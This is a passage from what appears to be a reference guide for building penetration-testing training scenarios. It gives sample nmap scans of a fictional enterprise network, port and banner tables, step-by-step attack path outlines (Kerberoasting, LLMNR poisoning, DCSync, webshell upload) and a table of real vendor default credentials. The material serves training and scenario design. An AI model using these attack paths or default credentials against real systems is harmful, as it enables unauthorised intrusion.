445/tcp   open  microsoft-ds  Windows Server 2022 Standard 20348 microsoft-ds
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Global Catalog over SSL)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-cert: Subject: commonName=DC-01.enterprise.local
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing

Host script results:
| smb2-security-mode:
|   3:1:1:
|     Message signing enabled but not required       # <-- VULNERABILITY
| smb2-time:
|   date: 2024-01-15T14:30:00
|   start_date: N/A
| smb-os-discovery:
|   OS: Windows Server 2022 Standard 20348
|   OS CPE: cpe:/o:microsoft:windows_server_2022
|   Computer name: DC-01
|   NetBIOS computer name: DC-01
|   Domain name: enterprise.local
|   Forest name: enterprise.local
|   FQDN: DC-01.enterprise.local

# ==========================================
# MANAGEMENT ZONE SCAN RESULTS
# ==========================================

# Target: 10.10.5.10 (jump-01 - Bastion Host)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
3389/tcp open  ms-wbt-server xrdp

# Target: 10.10.5.20 (siem-01 - Splunk)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
8000/tcp open  http    Splunkd httpd
|_http-title: splunkd
|_http-server-header: Splunkd
8089/tcp open  ssl/http Splunkd httpd (management)
9997/tcp open  unknown  Splunk forwarder

# Target: 10.10.5.21 (monitor-01 - Prometheus + Grafana)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
3000/tcp open  http    Grafana
|_http-title: Grafana
9090/tcp open  http    Prometheus
|_http-title: Prometheus Time Series Collection and Processing Server

# ==========================================
# DEVOPS ZONE SCAN RESULTS
# ==========================================

# Target: 10.10.6.10 (ci-01 - Jenkins)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
8080/tcp  open  http    Jetty 10.0.x
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(10.0.15)
| http-robots.txt: 1 disallowed entry
|_/
50000/tcp open  http    Jenkins agent listener

# Target: 10.10.6.20 (repo-01 - Nexus)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
8081/tcp open  http    Sonatype Nexus Repository Manager 3.x
|_http-title: Sonatype Nexus Repository Manager
8082/tcp open  http    Docker Registry (Nexus)

# ==========================================
# USER ZONE SCAN RESULTS (Sample Workstation)
# ==========================================

# Target: 10.10.10.20 (ws-01 - Windows Workstation)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows 10 Enterprise 19045 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Host script results:
| smb2-security-mode:
|   3:1:1:
|     Message signing enabled but not required
```

### 5.5 Development vs Production Differentiation

| Indicator | Development | Production |
|-----------|------------|------------|
| **Debug Ports** | 9229 (Node), 5005 (Java JDWP), 5678 (Python debugpy) open | Debug ports closed/filtered |
| **Error Handling** | Verbose stack traces, debug pages | Generic error pages, no stack traces |
| **TLS/SSL** | Self-signed certificates, expired certs, HTTP available | Valid CA certificates, HTTPS enforced, HSTS |
| **Service Banners** | Full version disclosure (ServerTokens Full) | Minimal or stripped banners |
| **Dev Tools** | phpMyAdmin, Adminer, Webpack dev server (4200), Rails Webpacker (3035) | No dev tools exposed |
| **Ports** | Many high ports open (3000, 4200, 5000, 8000, 8080, 9229) | Only 80, 443 from external |
| **Admin Interfaces** | Accessible without auth, default credentials | IP-restricted, strong auth |
| **Headers** | `X-Powered-By`, `Server` with full version, `X-Debug-Token` | Headers stripped or minimal |
| **Database** | Bound to 0.0.0.0, weak/no auth | Bound to localhost/internal only, strong auth |
| **Firewall** | Permissive or none | Strict rules, WAF in place |
| **Monitoring** | No SIEM, no logging | Centralized logging, SIEM, IDS/IPS |
| **DNS** | `.local`, `.dev`, `.test`, `.internal` domains | Proper public domains |
| **SSH** | Password auth, root login allowed | Key-only, no root, bastion required |
| **Config Files** | `.env`, `config.yml` with plaintext secrets | Secrets in vault, env vars from orchestrator |
| **HTTP Methods** | TRACE, PUT, DELETE often enabled | Only GET, POST, HEAD typically |
| **CORS** | `Access-Control-Allow-Origin: *` | Specific origins whitelisted |
| **Rate Limiting** | None | Rate limiting on auth, API, search |
| **Directory Listing** | Often enabled | Disabled |
| **Source Maps** | `.js.map` files accessible | Source maps removed |

### 5.6 Common Port-to-Service Mapping Reference

| Port | Protocol | Service | Typical Banner |
|------|----------|---------|----------------|
| 21 | TCP | FTP | `vsFTPd 3.0.5`, `ProFTPD 1.3.8` |
| 22 | TCP | SSH | `OpenSSH_8.9p1 Ubuntu`, `OpenSSH_8.7 (protocol 2.0)` |
| 25 | TCP | SMTP | `Postfix`, `Microsoft ESMTP MAIL Service` |
| 53 | TCP/UDP | DNS | `Simple DNS Plus`, `dnsmasq-2.89`, `BIND 9.18` |
| 80 | TCP | HTTP | `Apache/2.4.57`, `nginx/1.24.0`, `Microsoft-IIS/10.0` |
| 88 | TCP/UDP | Kerberos | `Microsoft Windows Kerberos` |
| 110 | TCP | POP3 | `Dovecot pop3d` |
| 111 | TCP | RPCBind | `rpcbind 2-4` |
| 135 | TCP | MSRPC | `Microsoft Windows RPC` |
| 139 | TCP | NetBIOS-SSN | `Samba smbd 4.x`, `Microsoft Windows netbios-ssn` |
| 143 | TCP | IMAP | `Dovecot imapd` |
| 389 | TCP/UDP | LDAP | `Microsoft Windows Active Directory LDAP` |
| 443 | TCP | HTTPS | Same as 80 but with SSL/TLS |
| 445 | TCP | SMB | `Samba 4.17.x`, `Windows Server 2022` |
| 464 | TCP/UDP | Kpasswd | Kerberos password change |
| 465 | TCP | SMTPS | Implicit TLS SMTP |
| 514 | TCP/UDP | Syslog | `rsyslogd` |
| 587 | TCP | SMTP Submission | `Postfix`, `Microsoft Exchange` |
| 636 | TCP | LDAPS | AD LDAP over SSL |
| 993 | TCP | IMAPS | `Dovecot imapd` |
| 995 | TCP | POP3S | `Dovecot pop3d` |
| 1099 | TCP | Java RMI | Java RMI Registry |
| 1194 | UDP | OpenVPN | OpenVPN |
| 1433 | TCP | MSSQL | `Microsoft SQL Server 2022` |
| 1434 | UDP | MSSQL Browser | SQL Server Browser |
| 1521 | TCP | Oracle TNS | `Oracle TNS listener 19.0.0.0.0` |
| 2049 | TCP | NFS | `NFS v3/v4` |
| 2222 | TCP | SSH (alt) | `OpenSSH` (GitLab, Docker) |
| 2375 | TCP | Docker API | Docker daemon (no TLS) |
| 2376 | TCP | Docker API | Docker daemon (with TLS) |
| 3000 | TCP | HTTP (App) | `Grafana`, `Node.js`, `Ruby/Puma`, `Gitea` |
| 3268 | TCP | LDAP GC | AD Global Catalog |
| 3269 | TCP | LDAPS GC | AD Global Catalog over SSL |
| 3306 | TCP | MySQL | `MySQL 8.0.x`, `MariaDB 10.11.x` |
| 3389 | TCP | RDP | `Microsoft Terminal Services` |
| 4200 | TCP | HTTP (Dev) | Angular CLI dev server |
| 4443 | TCP | HTTPS (Alt) | Various |
| 5000 | TCP | HTTP (Dev) | Flask/Docker Registry |
| 5001 | TCP | HTTPS (Dev) | .NET Kestrel |
| 5005 | TCP | JDWP | Java Debug Wire Protocol |
| 5432 | TCP | PostgreSQL | `PostgreSQL 15.4` |
| 5555 | TCP | HP Data Protector/Misc | Various |
| 5601 | TCP | Kibana | `Kibana` dashboard |
| 5672 | TCP | AMQP | `RabbitMQ 3.12.x` |
| 5985 | TCP | WinRM HTTP | `Microsoft HTTPAPI` |
| 5986 | TCP | WinRM HTTPS | `Microsoft HTTPAPI` |
| 6379 | TCP | Redis | `Redis 7.0.x` |
| 6443 | TCP | Kubernetes API | `Kubernetes API Server` |
| 7001 | TCP | WebLogic | `Oracle WebLogic Server` |
| 7002 | TCP | WebLogic SSL | `Oracle WebLogic Server` |
| 8000 | TCP | HTTP (App) | `Splunkd`, Django, various |
| 8009 | TCP | AJP | `Apache Jserv (Protocol v1.3)` |
| 8080 | TCP | HTTP (App) | `Tomcat`, `Jenkins`, `JBoss`, `Spring Boot` |
| 8081 | TCP | HTTP (App) | `Nexus`, `Artifactory`, `McAfee ePO` |
| 8082 | TCP | HTTP (App) | Docker Registry, various |
| 8443 | TCP | HTTPS (App) | Various application HTTPS |
| 8888 | TCP | HTTP (Dev) | Jupyter Notebook |
| 9000 | TCP | HTTP/Various | `Graylog`, `SonarQube`, PHP-FPM |
| 9090 | TCP | HTTP | `Prometheus`, `Cockpit`, `WebLogic admin` |
| 9092 | TCP | Kafka | Apache Kafka broker |
| 9200 | TCP | Elasticsearch | `Elasticsearch REST API 8.x` |
| 9229 | TCP | Node.js Debug | V8 Inspector |
| 9300 | TCP | Elasticsearch | Cluster communication |
| 9418 | TCP | Git | Git protocol |
| 9990 | TCP | HTTP | JBoss/WildFly management |
| 9997 | TCP | Splunk | Splunk forwarder |
| 10000 | TCP | HTTP | Webmin |
| 10250 | TCP | Kubernetes | kubelet API |
| 11211 | TCP/UDP | Memcached | `Memcached 1.6.x` |
| 15672 | TCP | HTTP | RabbitMQ Management |
| 27017 | TCP | MongoDB | `MongoDB 6.0.x` |
| 50000 | TCP | HTTP | Jenkins agent |
| 51820 | UDP | WireGuard | WireGuard VPN |

---

## 6. Appendix: Scenario Generation Reference Tables

### 6.1 Difficulty-to-Misconfiguration Mapping

| Difficulty | Misconfiguration Type | Examples |
|------------|----------------------|----------|
| **Easy** | Default credentials, no auth | MongoDB no auth, Redis no password, Jenkins anonymous access, Tomcat default creds |
| **Easy** | Information disclosure | Server banners, directory listing, debug pages, phpinfo(), .git exposure |
| **Easy** | Missing security controls | No HTTPS, no rate limiting, no CSRF tokens, verbose errors |
| **Medium** | Auth/session issues | Weak JWT secrets, session fixation, password reset flaws, predictable tokens |
| **Medium** | Injection (basic) | Simple SQLi in login, reflected XSS in search, command injection in ping utility |
| **Medium** | Access control | IDOR via sequential IDs, missing function-level auth, privilege escalation via mass assignment |
| **Medium** | Network segmentation | DMZ to internal flat network, database accessible from DMZ, management interfaces in wrong zone |
| **Hard** | Complex injection | Blind SQLi, second-order SQLi, NoSQLi, LDAP injection, SSTI, deserialization |
| **Hard** | Chained exploits | SSRF → internal service access, LFI → config read → credential reuse, DNS rebinding |
| **Hard** | AD attacks | Kerberoasting, AS-REP roasting, delegation abuse, ACL abuse, DCSync, Golden/Silver tickets |
| **Hard** | Cryptographic | Padding oracle, weak MAC on ViewState, JWT key confusion (RS256→HS256) |

### 6.2 Attack Path Templates

**Startup Path:**
```
1. Port scan → find open services (MySQL 3306, dev ports)
2. Banner grabbing → identify versions
3. Default credentials → access database / admin panel
4. Data exfiltration or webshell upload
5. Privilege escalation on host
```

**SMB Path:**
```
1. External scan → web servers, mail server in DMZ
2. Web application testing → SQLi/XSS in e-commerce app
3. Exploit web vuln → gain app-tier access
4. Pivot from DMZ → internal network (flat firewall rules)
5. Access database → exfiltrate customer data
6. Lateral movement → file server, backup data
```

**Enterprise Path:**
```
1. External scan → load balancer, VPN, mail
2. Phishing / credential stuffing → user account
3. VPN access → internal network
4. LLMNR/NBT-NS poisoning → capture NTLMv2 hashes
5. Crack/relay hashes → access workstation
6. Kerberoasting → crack service account passwords
7. Lateral movement → app servers
8. Access CI/CD → find credentials/secrets
9. Privilege escalation → Domain Admin
10. DCSync → dump all domain hashes
```

### 6.3 Realistic Hostname Patterns

| Environment | Hostname Convention | Examples |
|-------------|-------------------|----------|
| Startup | Simple names | `web1`, `db1`, `app1`, `dev-server` |
| SMB | Function-based | `web-01`, `mail-01`, `db-prod-01`, `file-server` |
| Enterprise (Linux) | Location-function-number | `us-web-01`, `eu-app-03`, `ny-db-01` |
| Enterprise (Windows) | Site prefix + role | `NYC-DC01`, `LAX-FS01`, `CHI-WS042` |
| Cloud/K8s | Auto-generated | `ip-10-0-1-234`, `i-0abc123def`, `pod-web-7d8f9-xk2l4` |
| Standard AD | Domain prefix | `CORP-DC01`, `CORP-SQL01`, `CORP-WEB01` |

### 6.4 IP Address Allocation Patterns

| Zone | Typical CIDR | Purpose |
|------|-------------|---------|
| `10.0.0.0/24` or `192.168.1.0/24` | Flat startup network |
| `10.0.1.0/24` | DMZ / Public-facing |
| `10.0.2.0/24` | Application tier |
| `10.0.3.0/24` | Database / Data tier |
| `10.0.4.0/24` | Identity / Directory services |
| `10.0.5.0/24` | Management / Monitoring |
| `10.0.6.0/24` | DevOps / CI-CD |
| `10.0.7.0/24` | Internal services (file, print) |
| `10.0.10.0/23` | User workstations (larger subnet) |
| `172.16.0.0/16` | Inter-site / VPN tunnels |
| `192.168.100.0/24` | Guest / IoT network |

### 6.5 Common Domain / DNS Patterns

```
# Internal domains
enterprise.local
corp.local
company.internal
ad.company.com
int.company.com

# DNS records commonly found
A     dc-01.enterprise.local        → 10.10.4.10
A     mail.enterprise.local         → 10.10.1.40
A     vpn.enterprise.local          → <public IP>
A     portal.enterprise.local       → 10.10.1.10
CNAME www.enterprise.local          → lb-01.enterprise.local
MX    enterprise.local              → mail.enterprise.local (priority 10)
SRV   _ldap._tcp.enterprise.local   → dc-01.enterprise.local:389
SRV   _kerberos._tcp.enterprise.local → dc-01.enterprise.local:88
TXT   enterprise.local              → "v=spf1 mx ip4:x.x.x.x -all"
```

### 6.6 SSL/TLS Certificate Patterns

| Environment | Certificate Properties |
|-------------|----------------------|
| **Development** | Self-signed, CN=localhost, expired, SHA-1, RSA 1024-bit |
| **Staging** | Let's Encrypt staging, CN=staging.company.com, short-lived |
| **Production** | DigiCert/Sectigo/Let's Encrypt, CN=www.company.com, SAN entries, RSA 2048/4096 or ECDSA P-256, valid 90-397 days |
| **Internal** | Enterprise CA signed, CN=service.enterprise.local, RSA 2048 |
| **Expired** | Any CA, past notAfter date, common finding in VAPT |
| **Wildcard** | `*.company.com`, found in production, risk of key compromise |

### 6.7 Common Credentials Found During VAPT

| Context | Username | Password | Notes |
|---------|----------|----------|-------|
| Tomcat Manager | tomcat | tomcat | Default |
| Tomcat Manager | admin | admin | Common |
| Jenkins | admin | admin | Default setup |
| JBoss Console | admin | admin | Default |
| WebLogic | weblogic | welcome1 | Default |
| RabbitMQ | guest | guest | Default |
| Grafana | admin | admin | Default |
| Splunk | admin | changeme | Default |
| phpMyAdmin | root | (empty) | MySQL default |
| MySQL | root | root | Common |
| PostgreSQL | postgres | postgres | Common |
| MongoDB | (none) | (none) | No auth |
| Redis | (none) | (none) | No password |
| WordPress | admin | admin123 | Common |
| Joomla | admin | admin | Common |
| Spring Boot | user | (console-generated) | Default Spring Security |
| Rails Admin | admin@example.com | password | ActiveAdmin default |
| Nexus | admin | admin123 | Default |
| SonarQube | admin | admin | Default |
| Kibana/Elastic | elastic | changeme | Default (pre-8.0) |
| Memcached | (none) | (none) | No auth by design |
| Docker Registry | (none) | (none) | Often no auth |
| Kubernetes Dashboard | (none) | (none) | Often exposed |
| GitLab | root | 5iveL!fe | Old default |
| Zabbix | Admin | zabbix | Default |
| Nagios | nagiosadmin | nagios | Common |
| Webmin | root | (system password) | Uses OS auth |
| IPMI/BMC | ADMIN | ADMIN | Default |
| Dell iDRAC | root | calvin | Default |
| HP iLO | Administrator | (random on tag) | Check hardware tag |
